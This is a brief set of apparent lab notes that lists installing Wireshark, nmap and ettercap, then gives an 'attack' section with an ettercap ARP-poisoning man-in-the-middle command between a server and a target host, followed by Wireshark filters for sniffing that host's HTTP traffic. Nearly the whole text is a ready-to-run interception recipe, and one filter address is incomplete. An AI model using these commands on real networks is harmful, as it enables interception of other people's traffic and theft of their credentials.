**tools**
<pre>
apt install wireshark
apt install nmap
apt install ettercap-text-only
</pre>

**attack**
<pre>
  sudo ettercap -T -S -i eth0 -M arp:remote /server_ip// /target_ip/
 open wireshark
  sudo wireshark
 select the eth0 or wlan0
 FILTERS: ip.addr == 10.0.4
          ip.addr == 10.0.4 && http

</pre>
